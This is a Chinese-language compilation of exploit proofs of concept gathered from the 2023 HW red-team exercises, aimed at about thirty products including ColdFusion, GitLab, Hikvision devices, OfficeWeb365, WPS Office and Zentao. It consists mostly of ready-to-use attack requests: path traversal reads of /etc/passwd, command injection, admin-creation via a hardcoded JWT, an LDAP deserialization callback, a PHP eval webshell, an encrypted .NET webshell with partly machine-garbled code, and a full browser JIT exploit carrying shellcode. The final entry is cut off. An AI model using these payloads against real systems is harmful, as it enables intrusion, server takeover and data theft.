---
sidebar: auto
---

# 一、2023HW漏洞POC/EXP、情报汇总知识库

## 1.1Panel后台存在任意文件读取漏洞

**漏洞描述**

1Panel后台存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感信息文件

```
POST /api/v1/file/loadfile {"paht":"/etc/passwd"}
```

## 2.360 新天擎终端安全管理系统信息泄露漏洞

```
http://ip:port/runtime/admin_log_conf.cache
```

## 3.Adobe ColdFusion 反序列化漏洞CVE-2023-29300

```
POST /CFIDE/adminapi/base.cfc?method= HTTP/1.1
Host: 1.2.3.4:1234
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 400
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
cmd: id

argumentCollection=
<wddxPacket version='1.0'>
    <header/>
    <data>
        <struct type='xcom.sun.rowset.JdbcRowSetImplx'>
            <var name='dataSourceName'>
                <string>ldap://xxx.xxx.xxx:1234/Basic/TomcatEcho</string>
            </var>
            <var name='autoCommit'>
                <boolean value='true'/>
            </var>
        </struct>
    </data>
</wddxPacket>
```
## 4.CODING平台idna目录存在目录遍历漏洞

CODing.net是一个面向开发者的云端开发平台，提供 Git/SVN 代码托管、任务管理，在idna存在目录泄露漏洞，攻击者可获取目录文件信息。

检索条件: title="一站式软件研发管理平台"

```
relative: req0
session: false
requests:
- method: GET
timeout: 10
path: /ci/pypi/simple/idna/
headers:
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2786.81 Safari/537.36
follow_redirects: true
matches: (code.eq("200") && body.contains("Index of"))
```

## 5.Coremail 邮件系统未授权访问获取管理员账密

POC：
```
/coremail/common/assets/:/:/:/:/:/:/s?

biz=Mzl3MTk4NTcyNw==&mid=2247485877&idx=1&sn=7e5f77db320ccf9013c0b7aa7262

6688chksm=eb3834e5dc4fbdf3a9529734de7e6958e1b7efabecd1c1b340c53c80299ff5c688b

f6adaed61&scene=2
```

## 6.Eramba任意代码执行漏洞


**0x01 漏洞详情**

**CVE-2023-36255**

**漏洞类型：**远程代码执行

**影响：**接管服务器

**简述：**Eramba存在远程代码执行漏洞，允许经过身份验证的用户执行任意代码。

### 

**0x02 影响版本**

- Enterprise and Community edition <= 3.19.1

```
GET /settings/download-test-pdf?path=ip%20a; HTTP/1.1
Host: [redacted]
Cookie: translation=1; csrfToken=1l2rXXwj1D1hVyVRH%2B1g%2BzIzYTA3OGFiNWRjZWVmODQ1OTU1NWEyODM2MzIwZTZkZTVlNmU1YjY%3D; PHPSESSID=14j6sfroe6t2g1mh71g2a1vjg8
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: de,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://[redacted]/settings
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```

```
HTTP/1.1 500 Internal Server Error
Date: Fri, 31 Mar 2023 12:37:55 GMT
Server: Apache/2.4.41 (Ubuntu)
Access-Control-Allow-Origin: *
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Disposition: attachment; filename="test.pdf"
X-DEBUGKIT-ID: d383f6d4-6680-4db0-b574-fe789abc1718
Connection: close
Content-Type: text/html; charset=UTF-8
Content-Length: 2033469

<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8"/> <meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>
Error: The exit status code '127' says something went wrong:
stderr: &quot;sh: 1: --dpi: not found
&quot;
stdout: &quot;1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether [redacted] brd ff:ff:ff:ff:ff:ff
    inet [redacted] brd [redacted] scope global ens33
       valid_lft forever preferred_lft forever
    inet6 [redacted] scope link
       valid_lft forever preferred_lft forever
&quot;
command: ip a; --dpi '90' --lowquality --margin-bottom '0' --margin-left '0'
--margin-right '0' --margin-top '0' --orientation 'Landscape'
--javascript-delay '1000' '/tmp/knp_snappy6426d4231040e1.91046751.html'
'/tmp/knp_snappy6426d423104587.46971034.pdf'. </title>

[...]
```
## 7.gitlab路径遍历读取任意文件漏洞

可能需要登录
```
GET /group1/group2/group3/group4/group5/group6/group7/group8/group9/project9/uploads/4e02c376ac758e162ec674399741e38d//..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
```
## 8.HIKVISION 视频编码设备接入网关 showFile.php 任意文件下载漏洞
```
<?php
          $file_name = $_GET['fileName'];
          $file_path = '../../../log/'.$file_name;
          $fp = fopen($file_path, "r");
          while($line = fgets($fp)){
            $line = nl2br(htmlentities($line, ENT_COMPAT, "utf-8"));
            echo '<span style="font-size:16px">'.$line.'</span>';
          }
          fclose($fp);
?>
```



```
/serverLog/showFile.php?fileName=../web/html/main.php
```

## 9.HiKVISION 综合安防管理平台 env 信息泄漏漏洞
```
/artemis-portal/artemis/env
```
## 10.Hytec Inter HWL-2511-SS popen.cgi命令注入漏洞
```
title="index" && header="lighttpd/1.4.30"
```

```
/cgi-bin/popen.cgi?command=ping%20-c%204%201.1.1.1;cat%20/etc/shadow&v=0.1303033443137912
```

## 10.Jeecg-Boot Freemarker 模版注入漏洞

## 11.KubePi JwtSigKey 登陆绕过漏洞（CVE-2023-22463）

**漏洞描述**

KubePi 中存在 JWT 硬编码，攻击者通过硬编码可以获取服务器后台管理权限，添加任意用户

**漏洞影响**

库贝派

**网络测绘**

“库贝皮”

```
POST /kubepi/api/v1/users HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36
accept: application/json
Accept-Encoding: gzip, deflate
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJuaWNrTmFtZSI6IkFkbWluaXN0cmF0b3IiLCJlbWFpbCI6InN1cHBvcnRAZml0MmNsb3VkLmNvbSIsImxhbmd1YWdlIjoiemgtQ04iLCJyZXNvdXJjZVBlcm1pc3Npb25zIjp7fSwiaXNBZG1pbmlzdHJhdG9yIjp0cnVlLCJtZmEiOnsiZW5hYmxlIjpmYWxzZSwic2VjcmV0IjoiIiwiYXBwcm92ZWQiOmZhbHNlfX0.XxQmyfq_7jyeYvrjqsOZ4BB4GoSkfLO2NvbKCEQjld8

{
  "authenticate": {
       "password": "{{randstr}}"
  },
  "email": "{{randstr}}@qq.com",
  "isAdmin": true,
  "mfa": {
          "enable": false
   },
  "name": "{{randstr}}",
  "nickName": "{{randstr}}",
  "roles": [
       "Supper User"
  ]
}
```

## 12.Kuboard默认口令
漏洞描述：

Kuboard，是一款免费的 Kubernetes 图形化管理工具，Kuboard 力图帮助用户快速在 Kubernetes 上落地微服务。Kuboard存在默认口令可以通过默认口令登录Kuboard，管理Kubernetes。
```
admin/kuboard123
```
## 13LiveBos ShowImage.do文件imgName参数读取漏洞
```
/feed/ShowImage.do;.js.jsp?type=&imgName=../../../../../../../../../../../../../../../etc/passwd
```

## 13.Milesight VPN server.js 任意文件读取漏洞

POC:

GET /../etc/passwd HTTP/1.1

Host:

Accept: */*

Content-Type: application/x-www-form-urlencoded
## 14.Nacos-Sync
**漏洞成因**

没进行权限校验。

影响范围：Nacos-Sync 3.0

fofa发现

```
title="nacos" &amp;&amp; title=="Nacos-Sync"
```

路径拼接

```
/#/serviceSync
```

 利用方式

访问之后直接是进入后台的样子~

## 15.nginx配置错误导致的路径穿越风险

漏洞自查PoC如下： https://github.com/hakaioffsec/navgix 该漏洞非0day，是一个路径穿越漏洞，可以直接读取nginx后台服务器文件。 有多家重点金融企业已中招，建议尽快进行自查。
## 16.OfficeWeb365 远程代码执行漏洞
【消息详情】：360漏洞云监测到网传《OfficeWeb365 远程代码执行漏洞》的消息，经漏洞云复核，确认为【真实】漏洞，漏洞影响【未知】版本，该漏洞标准化POC已经上传漏洞云情报平台，平台编号：360LDYLD-2023-00002453，情报订阅用户可登录漏洞云情报平台( https://loudongyun.360.cn/bug/list )查看漏洞详情。

360漏洞云监测到网传《OfficeWeb365远程代码执行漏洞》的消息，经漏洞云复核，确认为【真实】漏洞，漏洞影响【未知】版本，该漏洞标准化POC已经升级漏洞云情报平台，平台编号： 360LDYLD-2023-00002453

\# 详细

```
POST /PW/SaveDraw?path=../../Content/img&idx=1.aspx HTTP/1.1
主持人：xxx
用户代理：Mozilla/5.0（Macintosh；Intel Mac OS X 10_15_7）AppleWebKit/537.36（KHTML，如 Gecko）Chrome/88.0.434.18 Safari/537.36
内容长度：2265
内容类型：application/x-www-form-urlencoded
接受编码：gzip、deflate
连接：关闭
数据:image/png;base64,01s34567890123456789y12345678901234567m91<%@ 页面语言="C#" %>
    <%@Import 命名空间="System.Reflection" %>
    <脚本运行=“服务器”>
               私有字节[]解密（字节[]数据）
        {
            字符串键=“e45e329feb5d925b”；
            数据 = Convert.FromBase64String(System.Text.Encoding.UTF8.GetString(data));
            System.Security.Cryptography.RijndaelManaged aes = new System.Security.Cryptography.RijndaelManaged();
            aes.Mode = System.Security.Cryptography.CipherMode.ECB;
            aes.Key = Encoding.UTF8.GetBytes(key);
            aes.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
            return aes.CreateDecryptor().TransformFinalBlock(data, 0, data.Length);
        }
        私有字节[]加密（字节[]数据）
        {
            字符串键=“e45e329feb5d925b”；
            System.Security.Cryptography.RijndaelManaged aes = new System.Security.Cryptography.RijndaelManaged();
            aes.Mode = System.Security.Cryptography.CipherMode.ECB;
            aes.Key = Encoding.UTF8.GetBytes(key);
            aes.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
            返回 System.Text.Encoding.UTF8.GetBytes(Convert.ToBase64String(aes.CreateEncryptor().TransformFinalBlock(data, 0, data.Length)));
        }
    </脚本>
        <%
        //byte[] c=Request.BinaryRead(Request.ContentLength);Assembly.Load(Decrypt(c)).CreateInstance("U").Equals(this);
                byte[] c=Request.BinaryRead(Request.ContentLength);
          string asname=System.Text.Encoding.ASCII.GetString(new byte[] {0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x52,0x65,0x66,0x6c,0x65,0x63,0x74,0x69,0x6f, 0x6e,0x2e,0x41,0x73,0x73,0x65,0x6d,0x62,0x6c,0x79});
          类型程序集=Type.GetType(asname);
           MethodInfo load = assembly.GetMethod("Load",new Type[] {new byte[0].GetType()});
           对象 obj=load.Invoke(null, new object[]{Decrypt(c)});
           MethodInfo create = assembly.GetMethod("CreateInstance",new Type[] { "".GetType()});
           字符串名称 = System.Text.Encoding.ASCII.GetString(new byte[] { 0x55 });
           object pay=create.Invoke(obj,new object[] { name });
           pay.Equals(this);%>>---
```


## 17.Openfire身份认证绕过漏洞
```
GET 
/user-create.jsp?csrf=Sio3WOA89y2L9Rl&username=user1&name=&email=&password=Qwer1234&passwordConfirm=Qwer1234&isadmin=on&create=............
 HTTP/1.1
```
## 18.Panabit iXCache网关RCE漏洞CVE-2023-38646

```
POST /cgi-bin/Maintain/date_config HTTP/1.1
Host: 127.0.0.1:8443
Cookie: pauser_9667402_260=paonline_admin_44432_9663; pauser_9661348_661=paonline_admin_61912_96631
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 107

ntpserver=0.0.0.0%3Bwhoami&year=2000&month=08&day=15&hour=11&minute=34&second=53&ifname=fxp1
```

## 19.Panel loadfile 后台文件读取漏洞

```
POST /api/v1/file/loadfile {"paht":"/etc/passwd"}
```

## 20.PigCMS action_flashUpload 任意文件上传漏洞

```
POST /cms/manage/admin.php?m=manage&c=background&a=action_flashUpload
HTTP/1.1
Host:
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=----aaa
------aaa
Content-Disposition: form-data; name="filePath"; filename="test.php"
Content-Type: video/x-flv
<?php phpinfo();?>
------aaa



/cms/upload/images/2023/08/11/1691722887xXbx.php
```


## 21.QAX-Vpn存在x遍历及任意账号密码修改漏洞

```
https://x.xxx.xxx.cn/admin/group/x_group.php?id=1 
https://x.xxx.xxx.cn/admin/group/x_group.php?id=3 
cookie: admin id=1; gw admin ticket=1;
```
## 22.Smart S85F 任意文件读取

```
GET /log/decodmail.php?file=L2V0Yy9gc2xlZXAke0lGU30xMGAucGNhcA== HTTP/1.1
Host: x.x.x.x
Cookie: PHPSESSID=c36d5527fd784aa29748b3b1c50be7bc
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/114.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```

## 23.WPS RCE

wps影响范围为：WPS Office 2023 个人版 < 11.1.0.15120

WPS Office 2019 企业版 < 11.8.2.12085

POC

在1.html当前路径下启动http server并监听80端口，修改hosts文件（测试写死的） 

127.0.0.1 clientweb.docer.wps.cn.cloudwps.cn

漏洞触发需让域名规则满足clientweb.docer.wps.cn.{xxxxx}wps.cn cloudwps.cn和wps.cn没有任何关系

代码块在底下。（需要原pdf加wechat）

```
<script>

if(typeof alert === "undefined"){

alert = console.log;

}

let f64 = new Float64Array(1);

let u32 = new Uint32Array(f64.buffer);

function d2u(v) {

f64[0] = v;

return u32;

}

function u2d(lo, hi) {

u32[0] = lo;

u32[1] = hi;

return f64[0];

}

function gc(){ // major

for (let i = 0; i < 0x10; i++) {

new Array(0x100000);

}

}

function foo(bug) {

function C(z) {

Error.prepareStackTrace = function(t, B) {

return B[z].getThis();

};

let p = Error().stack;

Error.prepareStackTrace = null;

return p;

}

function J() {}

var optim = false;

var opt = new Function(

'a', 'b', 'c',

'if(typeof a===\'number\'){if(a>2){for(var

i=0;i<100;i++);return;}b.d(a,b,1);return}' +

'g++;'.repeat(70));

var e = null;

J.prototype.d = new Function(

'a', 'b', '"use strict";b.a.call(arguments,b);return arguments[a];');

J.prototype.a = new Function('a', 'a.b(0,a)');

J.prototype.b = new Function(

'a', 'b',

'b.c();if(a){' +

'g++;'.repeat(70) + '}');

J.prototype.c = function() {

if (optim) {

var z = C(3);

var p = C(3);

z[0] = 0;

e = {M: z, C: p};

}

};

var a = new J();

// jit optim

if (bug) {

for (var V = 0; 1E4 > V; V++) {

opt(0 == V % 4 ? 1 : 4, a, 1);

}

}

optim = true;

opt(1, a, 1);

return e;

}

e1 = foo(false);

e2 = foo(true);

delete e2.M[0];

let hole = e2.C[0];

let map = new Map();

map.set('asd', 8);

map.set(hole, 0x8);

map.delete(hole);

map.delete(hole);

map.delete("asd");

map.set(0x20, "aaaa");

let arr3 = new Array(0);

let arr4 = new Array(0);

let arr5 = new Array(1);

let oob_array = [];

oob_array.push(1.1);

map.set("1", -1);

let obj_array = {

m: 1337, target: gc

};

let ab = new ArrayBuffer(1337);

let object_idx = undefined;

let object_idx_flag = undefined;

let max_size = 0x1000;

for (let i = 0; i < max_size; i++) {

if (d2u(oob_array[i])[0] === 0xa72) {

object_idx = i;

object_idx_flag = 1;

break;

}if (d2u(oob_array[i])[1] === 0xa72) {

object_idx = i + 1;

object_idx_flag = 0;

break;

}

}

function addrof(obj_para) {

obj_array.target = obj_para;

let addr = d2u(oob_array[object_idx])[object_idx_flag] - 1;

obj_array.target = gc;

return addr;

}

function fakeobj(addr) {

let r8 = d2u(oob_array[object_idx]);

if (object_idx_flag === 0) {

oob_array[object_idx] = u2d(addr, r8[1]);

}else {

oob_array[object_idx] = u2d(r8[0], addr);

}

return obj_array.target;

}

let bk_idx = undefined;

let bk_idx_flag = undefined;

for (let i = 0; i < max_size; i++) {

if (d2u(oob_array[i])[0] === 1337) {

bk_idx = i;

bk_idx_flag = 1;

break;

}if (d2u(oob_array[i])[1] === 1337) {

bk_idx = i + 1;

bk_idx_flag = 0;

break;

}

}

let dv = new DataView(ab);

function get_32(addr) {

let r8 = d2u(oob_array[bk_idx]);

if (bk_idx_flag === 0) {

oob_array[bk_idx] = u2d(addr, r8[1]);

} else {

oob_array[bk_idx] = u2d(r8[0], addr);

}

let val = dv.getUint32(0, true);

oob_array[bk_idx] = u2d(r8[0], r8[1]);

return val;

}

function set_32(addr, val) {

let r8 = d2u(oob_array[bk_idx]);

if (bk_idx_flag === 0) {

oob_array[bk_idx] = u2d(addr, r8[1]);

} else {

oob_array[bk_idx] = u2d(r8[0], addr);

}

dv.setUint32(0, val, true);

oob_array[bk_idx] = u2d(r8[0], r8[1]);

}

function write8(addr, val) {

let r8 = d2u(oob_array[bk_idx]);

if (bk_idx_flag === 0) {

oob_array[bk_idx] = u2d(addr, r8[1]);

} else {

oob_array[bk_idx] = u2d(r8[0], addr);

}

dv.setUint8(0, val);

}

let fake_length = get_32(addrof(oob_array)+12);

set_32(get_32(addrof(oob_array)+8)+4,fake_length);

let wasm_code = new

Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,

128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,

128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0

,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);

let wasm_mod = new WebAssembly.Module(wasm_code);

let wasm_instance = new WebAssembly.Instance(wasm_mod);

let f = wasm_instance.exports.main;

let target_addr = addrof(wasm_instance)+0x40;

let rwx_mem = get_32(target_addr);

//alert("rwx_mem is"+rwx_mem.toString(16));

const shellcode = new Uint8Array([0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89,

0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30,0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14,

0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff,0xac, 0x3c, 0x61, 0x7c,

0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf2, 0x52,0x57, 0x8b,

0x52, 0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78, 0xe3, 0x48, 0x01,

0xd1,0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49, 0x18, 0xe3, 0x3a, 0x49,

0x8b, 0x34, 0x8b,0x01, 0xd6, 0x31, 0xff, 0xac, 0xc1, 0xcf, 0x0d, 0x01, 0xc7,

0x38, 0xe0, 0x75, 0xf6, 0x03,0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe4, 0x58,

0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b,0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01,

0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24,0x24, 0x5b, 0x5b, 0x61,

0x59, 0x5a, 0x51, 0xff, 0xe0, 0x5f, 0x5f, 0x5a, 0x8b, 0x12, 0xeb,0x8d, 0x5d,

0x6a, 0x01, 0x8d, 0x85, 0xb2, 0x00, 0x00, 0x00, 0x50, 0x68, 0x31, 0x8b,

0x6f,0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x68, 0xa6, 0x95, 0xbd,

0x9d, 0xff, 0xd5,0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,

0x47, 0x13, 0x72, 0x6f, 0x6a,0x00, 0x53, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63,

0x00]);

for(let i=0;i<shellcode.length;i++){

write8(rwx_mem+i,shellcode[i]);

}

f();

</script>
```

需要将在1.html当前路径下启动http server并监听80端口，修改hosts文件（测试写死的）

127.0.0.1 clientweb.docer.wps.cn.cloudwps.cn

漏洞触发需让域名规则满足clientweb.docer.wps.cn.{xxxxx}wps.cn即可，cloudwps.cn和wps.cn没有任何关系。正常攻击，也可以使用clientweb.docer.wps.cn.hellowps.cn.

## 24.yakit任意文件读取

详情可参考原文 有截图复现
原文链接：https://mp.weixin.qq.com/s/IQekVs-UU2Slh6V_frpaug

前言：
yakit是近年新兴的一个BurpSuite平替工具，和burp的区别就在于数据包放过去不用配置ip端口协议这些，但是yakit跑起来感觉卡卡的，远不如burp那么流畅，近期yakit爆出了一个任意文件读取漏洞，此漏洞通过在网页嵌入js代码实现读取yakit使用者设备上的文件
触发版本：
引擎版本< Yaklang 1.2.4-sp2
漏洞条件：
使用yakit的MITM代理并且启用任意插件

```
Pyload:
<script>
  const xhr = new XMLHttpRequest();
  xhr.open("POST", "http://yakit.com/filesubmit");
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  xhr.send(`file={{base64enc(file(C:\\Windows\\System32\\drivers\\etc\\hosts))}}`);
</script>
```

```
监听脚本
#! /bin/python3
import socket

# 监听地址和端口

host = '0.0.0.0'
port = 23800

# 创建socket服务器

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

# 绑定并监听端口

server.bind((host, port))
server.listen()

# 接收连接并监听请求

print("Listening...")
while True:
    # 接收客户端连接请求
    client, address = server.accept()
    print(f"Connected by {address}")

    # 读取客户端请求数据
    request = ''
    while True:
        input_data = client.recv(1024).decode('utf-8')
        request += input_data
        if len(input_data) < 1024:
            break
    
    # 提取请求头部
    headers = request.split('\n')
    print("Received headers:")
    for header in headers:
        print(header)
    
    # 关闭客户端连接
    client.close()


```

复现开始：
创建一个html页面并插入payload
```
启用MITM代理，不启用插件进行访问：
https://mmbiz.qpic.cn/sz_mmbiz_png/OF9Ieq8TATc71LlcBt5FGOn2ibomGw7wMXX7dh9j86aZ7JA0WMoxwHSDdAwnMVSZLoF09zuiamTpkibBtLto8y8KA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1
启用MITM代理并启用插件进行访问：
https://mmbiz.qpic.cn/sz_mmbiz_png/OF9Ieq8TATc71LlcBt5FGOn2ibomGw7wM1RvwO5nnYhpX3aKZeCDdziaCEcOSDfbIcu2wNe27x7aTsPgBXo8KTsQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1
```

原理：yakit默认不会对经过MITM代理的流量中的fuzztag进行解析，但是经过插件时会被解析，所以这也是利用限制。

## 25.安恒明御安全网关rce

```
GET /webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&$type=1&suffix=1|echo+"<%3fphp+eval(\$_POST[\"a\"]);?>"+>+.xxx.php HTTP/1.1
Host: xxx
Cookie: USGSESSID=495b895ddd42b82cd89a29f241825081
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10 16 0) Applewebkit/537.36 (KHTML likeGecko) Chrome/78.0.3994.108 Safari/537.36
Sec-Fetch-User: ?1
Accept:
text/html,application/xhtml+xml,application/xml;g=0.9,image/webp,image/apng,*/*;g=0.8,application/signed-exchange;v=b3
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Accept-Encoding: gzip， deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

木马地址: http://xxx/webui/.xxx.php

## 26.安恒明御运维审计与风险控制系统堡垒机任意用户注册

```
POST /service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://test/wsrpc HTTP/1.1
Host: xxx
Cookie: LANG=zh; USM=0a0e1f29d69f4b9185430328b44ad990832935dbf1b90b8769d297dd9f0eb848
Cache-Control: max-age=0
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 1121

<?xml version="1.0"?>
<methodCall>
<methodName>web.user_add</methodName>
<params>
<param>
<value>
<array>
<data>
<value>
<string>admin</string>
</value>
<value>
<string>5</string>
</value>
<value>
<string>XX.XX.XX.XX</string>
</value>
</data>
</array>
</value>
</param>
<param>
<value>
<struct>
<member>
<name>uname</name>
<value>
<string>deptadmin</string>
</value>
</member>
<member>
<name>name</name>
<value>
<string>deptadmin</string>
</value>
</member>
<member>
<name>pwd</name>
<value>
<string>Deptadmin@123</string>
</value>
</member>
<member>
<name>authmode</name>
<value>
<string>1</string>
</value>
</member>
<member>
<name>deptid</name>
<value>
<string></string>
</value>
</member>
<member>
<name>email</name>
<value>
<string></string>
</value>
</member>
<member>
<name>mobile</name>
<value>
<string></string>
</value>
</member>
<member>
<name>comment</name>
<value>
<string></string>
</value>
</member>
<member>
<name>roleid</name>
<value>
<string>101</string>
</value>
</member>
</struct></value>
</param>
</params>
</methodCall>
```

## 27.百卓 Smart S85F 后台文件上传漏洞

```
POST /useratte/web.php? HTTP/1.1
Host: xx.xx.xx.xx:8443
Cookie: PHPSESSID=xxxxx
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------42328904123665875270630079328
Content-Length: 598
Upgrade-Insecure-Requests: 1
Connection: close

-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="file_upload"; filename="2.php"
Content-Type: application/octet-stream

<?=phpinfo();
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="id_type"

1
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="1_ck"

1_radhttp
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="mode"

import
-----------------------------42328904123665875270630079328—

```

## 28.百卓Smart S45F命令执行


```
构造URL ：/importhtml.php?type=exporthtmlmail&amp;tab=tb_RCtrlLog&amp;sql=c2VsZWN0IDB4M2MzZjcwNjg3MDIwNjU2MzY4NmYyMDczNzk3Mzc0NjU2ZDI4MjQ1ZjUwNGY1MzU0NWIyMjYzNmQ2NDIyNWQyOTNiM2YzZSBpbnRvIG91dGZpbGUgJy91c3IvaGRkb2NzL25zZy9hcHAvc3lzMS5waHAn

构造poc：
POST /app/sys1.php HTTP/1.1
Host: 60.22.74.195:8443
Cookie: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 
1Sec-Fetch-Dest: 
documentSec-Fetch-Mode: 
navigateSec-Fetch-Site: 
noneSec-Fetch-User: ?1Te: trailers
Connection: close
Content-Type: application/x-www-form-url
encodedContent-Length: 6
 
 
 
cmd=id
```

## 29.禅道 16.5 router.class.php SQL注入漏洞
```
POST /user-login.html 
  
   account=admin%27+and+%28select+extractvalue%281%2Cconcat%280x7e%2C%28select+user%28%29%29%2C0x7e%29%29%29%23
```

## 30.禅道18.0~18.3 backstage命令注入
```
posT /zentaopms/www/index.php?m=zahost&f=create HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win4; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: application/json，text/javascript，*/*; g=0.01
Accept-Language: zh-CN,zh;g=0.8,zh-Tw;g=0.7,zh-HK;g=0.5,en-US;g=0.3,en;g=0.2
Accept-Encoding: gzip， deflate
Referer: http://127.0.0.1/zentaopms/www/index.php?m=zahost&f=create
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-with: XMLHttpRequest
Content-Length: 134
Origin: http://127.0.0.1
Connection: close
